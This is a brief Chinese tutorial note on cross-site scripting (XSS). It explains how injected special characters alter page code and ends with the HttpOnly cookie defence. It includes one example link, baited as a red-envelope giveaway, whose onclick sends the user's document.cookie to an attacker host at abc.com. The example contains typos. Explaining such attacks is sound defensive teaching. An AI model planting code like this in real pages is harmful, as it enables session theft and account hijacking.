---
title: XSS
---

XSS（Cross Site Script）跨站脚本攻击；其原本缩写是 CSS，但为了和层叠样式表(Cascading Style Sheet)有所区分，因而在安全领域叫做 XSS。

XSS 攻击其实本质比较简单，就是利用 html 里面的特殊字符(单引号，双引号，大于、小于等)，打乱正常的代码执行流程，并将恶意代码注入到系统中。

<div align="center">
    <img width="285" height="265" src="https://cosmos-x.oss-cn-hangzhou.aliyuncs.com/MrD1Vj.png" />
</div>

教程推荐：https://www.youtube.com/watch?v=QJzkifQ-Cuk

使用跨站点脚本技术可以窃取 cookie。当网站允许使用 javascript 操作 cookie 的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的 cookie 信息。

例子：

```html
<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
```

当用户点击这个链接的时候，浏览器就会执行 onclick 里面的代码，结果这个网站用户的 cookie 信息就会被发送到 abc.com 攻击者的服务器。攻击者同样可以拿 cookie 搞事情。

解决办法：可以通过 cookie 的 HttpOnly 属性，设置了 HttpOnly 属性，javascript 代码将不能操作 cookie。
